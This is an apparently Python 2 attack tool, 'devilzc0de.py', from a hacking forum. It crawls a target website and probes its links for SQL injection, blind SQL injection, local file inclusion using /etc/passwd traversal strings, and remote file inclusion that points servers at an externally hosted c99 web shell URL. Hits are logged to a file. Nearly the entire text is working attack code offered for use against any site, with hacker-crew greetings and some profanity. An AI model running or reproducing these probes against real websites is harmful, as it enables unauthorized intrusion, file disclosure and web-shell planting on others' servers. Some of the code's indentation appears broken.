#!/usr/bin/python
#devilzc0de.py version 1.0
# "\n\n\t\tlink extract routine sipped from by lipun4u[at]gmail[dot]com link extractor" 
# "\t\tcoding by mywisdom (mywisdom@jasakom.org)" 
#modified for devilzc0de sqli,blind,rfi and lfi and path disclosure via error message  against your target
# Greetz         : evidence@solhack, getch@solhack. foxx@solhack ... I miss you bro
# Special thanks to: asit_dhal( lipun4u[at]gmail[dot]com ) who inspire me 
# Special thanx for d3hydr8, baltazar, rsauron,jaya sangkar, inkubus,0n3l0ve,tundergun, gblack,wendy182, zeroc0de666,and all flash crews,etc
# Flash Crews(errorname,danzel,trtxx,etc...), h4cky0u members, jasakom members,hmsecurity crews and members, ex hackerzonline (sorry for ddosing)crews (pirus,cybermutaqqin,pitaqh,aurel,t0m,bunga,kiddes,idbajakan,adisatwa,adioranye,flyv66,meong,etc)
# Special thanks to my special foo : aibo,alabala -> my real foo they always blame me..thank you :-)
# and to all darkc0de members
#greetz to solhack crews 2004,leader: evidence@sdf,crews:getch@solhack,mywisdom@solhack and foxx@solhack
# Special thanks to Jasakom Members and Crews (sto,pirus,pitaqh,aurel666,tomahawk,kiddies,sat,flyv666,petimati,ketek,
# This tool is best combined with flashjumper.py
#greetz to gdc community (bl4ck3ng1ne,blok_undergound,xnome,cr4wl3r,mr saint,etc...)
###############################################################################
#    //  ) ) 										
# __//__  //  ___      ___     / __            ___      __      ___                     
#  //    // //   ) ) ((   ) ) //   ) ) ____  //   ) ) //  ) ) //___) ) //  / /  / /     
# //    // //   / /   \ \    //   / /       //       //      //       //  / /  / /      
#//    // ((___( ( //   ) ) //   / /       ((____   //      ((____   ((__( (__/ /
############################################################################## 
    
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
############################################################################## 

import urllib,sys,os,sgmllib 
rfi=""
myroot="root:x:"
anjing="c99shell"
cekrfi="http://xoomer.virgilio.it/divulgar/c99.txt?"
lfis = ["/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../../etc/passwd%00","/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../../etc/passwd"]
pathdisclosure1="/home/"
pathdisclosure2="/var/"
pathdisclosure3="/www/"
pathdisclosure4="/html/"
pathdisclosure5="/usr/"
pathdisclosure6="/user/"
pathdisclosure7="/sites/"
pathdisclosure8="/mnt"
pathdisclosure9="/etc/"
pathdisclosure10="/web/"
penghubung=" in "
gajebo="failed to open"
l2="http://www.googlebig.com/"
cachesqli="-"
cacheblind1="-"
cacheblind100="-"
log = "flashjumperlog.txt"
tanya="?"
samadengan="="
appname = os.path.basename(sys.argv[0]) 
ceksqli="'"
slash="/"
cekblind1="+order+by+1--"
cekblind100="+order+by+300--"
mysqli1="You have an error in your SQL"
mysqli2="Division by zero in"
mysqli3="supplied argument is not a valid MySQL result resource in"
mysqli4="Call to a member function"
accesqli1="Microsoft JET Database"
accesqli2="ODBC Microsoft Access Driver"
mssqli1="Microsoft OLE DB Provider for SQL Server"
mssqli2="Unclosed quotation mark"
oracle="Microsoft OLE DB Provider for Oracle"
mscfm="[Macromedia][SQLServer JDBC Driver][SQLServer]Incorrect"
general="Incorrect syntax near"
mywisdom="http://"
sat_ahyar="=1"
sat_ahyar=str(sat_ahyar)

class MyParser(sgmllib.SGMLParser): 
    "A simple parser class." 
 
    def parse(self, s): 
        "Parse the given string 's'." 
        self.feed(s) 
        self.close() 
 
    def __init__(self, verbose=0): 
        "Initialise an object, passing 'verbose' to the superclass." 
 
        sgmllib.SGMLParser.__init__(self, verbose) 
        self.hyperlinks = [] 
 
    def start_a(self, attributes): 
        "Process a hyperlink and its 'attributes'." 
 
        for name, value in attributes: 
            if name == "href": 
                self.hyperlinks.append(value) 
            if name == "src": 
                self.hyperlinks.append(value) 
 
    def get_hyperlinks(self): 
        "Return the list of hyperlinks." 
 
        return self.hyperlinks 
 
 
 
if len(sys.argv) <=1:
    print "Usage : " + appname + " -mode <url> " 
    print "e.g. : " + appname + " -sqli www.google.com " 
    print "Sample mode: -sqli ,-blind, -lfi, -rfi"
    sys.exit(1) 
elif "-h"  in sys.argv: 
    print "Usage : " + appname + " -mode <url> " 
    print "e.g. : " + appname + " -sqli www.google.com " 
    print "Sample mode: -sqli ,-blind, -lfi, -rfi"
    sys.exit(1) 
elif "--help" in sys.argv: 
    print "Usage : " + appname + "-mode <url> " 
    print "e.g. : " + appname + " -sqli www.google.com " 
    print "Sample mode: -sqli ,-blind, -lfi, -rfi"
    sys.exit(1) 
 
site = sys.argv[2].replace("http://","") 
site = "http://" + site.lower() 

mode=sys.argv[1]
try: 
    site_data = urllib.urlopen(site) 
    parser = MyParser() 
    parser.parse(site_data.read()) 
except(IOError),msg: 
    print "Error in connecting site ", site 
    print msg 
    sys.exit(1) 
links = parser.get_hyperlinks() 
print ""
print "***********************************" 
print "Devilzc0de.py version 1.0"
print "by:mywisdom (mywisdom[at]jasakom[dot]org"
print "searching sqli,blind,rfi and lfi and search path disclosure at your target"
print "***********************************"
print "Every w00t message will be logged at flashjumperlog.txt,check the log after scanning finished"
l2=site
urlbuta=site+slash
url_rfi_basic=site+slash
url_lfi_basic=site+slash
z=0
data=""
x=0
for l in links: 
	z=z+1
	if z>50:
		sys.exit(1)
        if mode=='-sqli':
		z=z+1
         	if z>50:
	        	sys.exit(1)
		htmlsqli=""
		nemu="no"
		tipe=""
		         
		if samadengan in l and tanya in l:
			if mywisdom not in l:
		               l2=l+ceksqli
		               if site not in l2:
				        l2=site+slash+l2
		                       
                        else :
			       if site in l:
				       l2=l+ceksqli
		        print "[-]Checking sqli at:"+l2     
		        response=urllib.urlopen(l2)
                        htmlsqli = response.read()   
			
		if mysqli1 in htmlsqli:
			nemu="yes"
			tipe="mysql injection"
	        elif mysqli2 in htmlsqli:
		       	nemu="yes"
			tipe="mysql injection"
		elif mysqli3 in htmlsqli:
		       	nemu="yes"
			tipe="mysql injection (error fetching array)"
		elif mysqli4 in htmlsqli:
		       	nemu="yes"
			tipe="oop application bug"
	 
		elif accesqli1 in htmlsqli:
			nemu="yes"
			tipe="ms access sql injection"
	        	
		elif accesqli2 in htmlsqli:
			nemu="yes"
			tipe="ms access sql injection"
	        	
		elif mssqli1 in htmlsqli:
			nemu="yes"
			tipe="mssql injection"
	        	
		elif mssqli2 in htmlsqli:
			nemu="yes"
			tipe="mssql injection"
	        	
		elif oracle in htmlsqli:
			nemu="yes"
			tipe="oracle sql injection"
	        	
		elif mscfm in htmlsqli:
			nemu="yes"
			tipe="cfm mssql injection"
	        	
		elif general in htmlsqli:
			nemu="yes"
			tipe="unidentified sql injection"
	        	
		if nemu=='yes':
			print "[+]W00t !! Found "+ tipe+ " Bug at:"+l2
			print "[+]Possible server's hole saved at flashjumperlog.txt"
			filelog = open(log, "a")
			filelog.write ("\n[+]W00t !! Found "+ tipe+ " Bug at:"+l2) 
                #tes path disclosure
		tahap2=l2.split('=')
		lx=tahap2[0]+sat_ahyar+ceksqli
		if tanya in lx and z<3:
		  print "[--]checking error request at:"+lx
		  response=urllib.urlopen(lx)
		  htmlsqli = response.read()   
			
		  if mysqli1 in htmlsqli:
			nemu="yes"
			tipe="mysql injection"
	          elif mysqli2 in htmlsqli:
		       	nemu="yes"
			tipe="mysql injection"
	        	
	  	  elif accesqli1 in htmlsqli:
			nemu="yes"
			tipe="ms access sql injection"
	        	
		  elif accesqli2 in htmlsqli:
			nemu="yes"
			tipe="ms access sql injection"
	        	
		  elif mssqli1 in htmlsqli:
			nemu="yes"
			tipe="mssql injection"
	        	
		  elif mssqli2 in htmlsqli:
			nemu="yes"
			tipe="mssql injection"
	        	
		  elif oracle in htmlsqli:
			nemu="yes"
			tipe="oracle sql injection"
	        	
		  elif mscfm in htmlsqli:
			nemu="yes"
			tipe="cfm mssql injection"
	        	
		  elif general in htmlsqli:
			nemu="yes"
			tipe="unidentified sql injection"
	        
		  elif gajebo in htmlsqli:
			nemu="yes"
			tipe="unidentified error message"
	        
		  elif pathdisclosure1 in htmlsqli and penghubung in htmlsqli:
			nemu="yes"
			tipe="path discosure /home/"
		  elif pathdisclosure2 in htmlsqli and penghubung in htmlsqli:
			nemu="yes"
			tipe="path disclosure /var/"
		  elif pathdisclosure3 in htmlsqli and penghubung in htmlsqli:
			nemu="yes"
			tipe="path disclosure /www/"
		  elif pathdisclosure4 in htmlsqli and penghubung in htmlsqli:
			nemu="yes"
			tipe="path disclosure /html/"
		  elif pathdisclosure5 in htmlsqli and penghubung in htmlsqli:
			nemu="yes"
			tipe="path disclosure /usr/"
		  elif pathdisclosure6 in htmlsqli and penghubung in htmlsqli:
			nemu="yes"
			tipe="path disclosure /user/"
		  elif pathdisclosure7 in htmlsqli and penghubung in htmlsqli:
			nemu="yes"
			tipe="path disclosure /sites/"
		  elif pathdisclosure8 in htmlsqli and penghubung in htmlsqli:
			nemu="yes"
			tipe="path disclosure /mnt/"
		  elif pathdisclosure9 in htmlsqli and penghubung in htmlsqli:
			nemu="yes"
			tipe="path disclosure /etc/"
		  elif pathdisclosure10 in htmlsqli and penghubung in htmlsqli:
			nemu="yes"
			tipe="path disclosure /web/"
		
		
	        	
		  if nemu=='yes':
			print "[+]W00t !! Found "+ tipe+ " Bug at:"+lx
			print "[+]Possible server's hole saved at flashjumperlog.txt"
			filelog = open(log, "a")
			filelog.write ("\n[+]W00t !! Found "+ tipe+ " Bug at:"+lx) 
		
		
	elif mode=='-blind':
		z=z+1
         	if z>50:
	        	sys.exit(1)
		nemu="no"
		l1=urlbuta
		l100=urlbuta
		if samadengan in l:
			if mywisdom not in l:
		               l1=l+cekblind1
		               if site not in l1:
				        l1=site+slash+l1
			       l100=l+cekblind100
		               if site not in l100:
				        l100=site+slash+l100
                        else :
			       if site in l:
				       l1=l+cekblind1
				       l100=l+cekblind100
		        print "[-]Saving response length for blind sqli at :"+l1     
		        response=urllib.urlopen(l1)
                        cacheblind1 = response.read()
		        print "[-]Saving response length for blind sqli at :"+l100     
		        response=urllib.urlopen(l100)
                        cacheblind100 = response.read()
			panjangblind1=len(cacheblind1)
			panjangblind100=len(cacheblind100)
			if panjangblind1!=panjangblind100:
				print "[+]W00t !! Found Possible Blind sqli Bug at:"+l100
				print "[+]Possible server's hole saved at flashjumperlog.txt"
				filelog = open(log, "a")
			        filelog.write ("\n[+]W00t !! Found Possible Blind sqli Bug at:"+l100) 
			else:
				print "[-]Sorry no possible blind found here !"
		   
		   
		   
		   
        elif mode=='-lfi':
	      z=z+1
	      if z>50:
	        	sys.exit(1)
              for ceklfi in lfis:  
                 htmllfi="alabala ngentot akun darkc0denya udah gw 0wned hahahaha"
		 
		 if samadengan in l:
                    	if mywisdom not in l:
			       beforelfi=l.split('=')
			       pj=len(beforelfi)
                               da=0
                               kont=""
			       for x in beforelfi:
				    da=da+1
                                    if da<pj:
	                               kont=kont+x+"="

		               lfi=kont+ceklfi
		               if site not in lfi:
				        lfi=site+slash+lfi
		                       
                        else :
			       if site in l:
				           
				          
				       beforelfi=l.split('=')
			               pj=len(beforelfi)
                                       da=0
                                       kont=""
			               for x in beforelfi:
                                           da=da+1
                                           if da<pj:
				         	   kont=kont+x+"="
				       lfi=kont+ceklfi
		        if lfi!="":
		           print "[-]Checking lfi at:"+lfi     
		           try:
			      response=urllib.urlopen(lfi)
			      htmllfi = response.read()   
			   except(IOError),msg: 
                              print "Error in testing url: ", lfi
                              print msg 
			if myroot in htmllfi:
			      		print "[+]W00t !! Found lfi Bug at:"+lfi
	                 		print "[+]Possible server's hole saved at flashjumperlog.txt"
			                filelog = open(log, "a")
					filelog.write ("\n[+]W00t !! Found lfi Bug at:"+lfi) 
		 if samadengan in l:
			if mywisdom not in l:
		               lfi=l
		               if site not in lfi:
				        lfi=site+slash+lfi
		                       
                        else :
			       if site in l:
				       lfi=l
				       
		        tahap3=lfi.split('=')
			lfix=tahap3[0]+samadengan+ceklfi
			if tanya in lfix:
		              print "[--]checking lfi at:"+lfix
		    
                        try:
			      response=urllib.urlopen(lfix)
			      htmllfi = response.read()   
			except(IOError),msg: 
                              print "Error in testing url: ", lfix
                              print msg 
			      
		        if myroot in htmllfi:
			      		print "[+]W00t !! Found lfi Bug at:"+lfix
	                 		print "[+]Possible server's hole saved at flashjumperlog.txt"
			                filelog = open(log, "a")
					filelog.write ("\n[+]W00t !! Found lfi Bug at:"+lfix) 
	          		 	
		      	 
	elif mode=='-rfi':
	   	 z=z+1
         	 if z>50:
	        	sys.exit(1)
		 htmlrfi="alabala ngentot akun darkc0denya udah gw 0wned hahahaha"
		 if samadengan in l:
                    	if mywisdom not in l:
			       beforerfi=l.split('=')
			       pj=len(beforerfi)
                               da=0
                               kont=""
			       for x in beforerfi:
				    da=da+1
                                    if da<pj:
	                               kont=kont+x+"="

		               rfi=kont+cekrfi
		               if site not in rfi:
				        rfi=site+slash+rfi
		                       
                        else :
			       if site in l:
				           
				          
				       beforerfi=l.split('=')
			               pj=len(beforerfi)
                                       da=0
                                       kont=""
			               for x in beforerfi:
                                           da=da+1
                                           if da<pj:
				         	   kont=kont+x+"="
				       rfi=kont+cekrfi
		        if rfi!="":
		           print "[-]Checking rfi at:"+rfi     
		           try:
			      response=urllib.urlopen(rfi)
			      htmlrfi = response.read()   
			   except(IOError),msg: 
                              print "Error in testing url: ", rfi
                              print msg 
			if anjing in htmlrfi:
			      		print "[+]W00t !! Found rfi Bug at:"+rfi
	                 		print "[+]Possible server's hole saved at flashjumperlog.txt"
			                filelog = open(log, "a")
					filelog.write ("\n[+]W00t !! Found rfi Bug at:"+rfi) 
		
	         if samadengan in l:
			if mywisdom not in l:
		               rfi=l
		               if site not in rfi:
				        rfi=site+slash+rfi
		                       
                        else :
			       if site in l:
				       rfi=l
				       
		        tahap3=rfi.split('=')
			rfix=tahap3[0]+samadengan+cekrfi
			if tanya in rfix:
		              print "[--]checking rfi at:"+rfix
		    
                        try:
			      response=urllib.urlopen(rfix)
			      htmlrfi = response.read()   
			except(IOError),msg: 
                              print "Error in testing url: ", rfix
                              print msg 
			      
		        if anjing in htmlrfi:
			      		print "[+]W00t !! Found rfi Bug at:"+rfix
	                 		print "[+]Possible server's hole saved at flashjumperlog.txt"
			                filelog = open(log, "a")
					filelog.write ("\n[+]W00t !! Found rfi Bug at:"+rfix) 

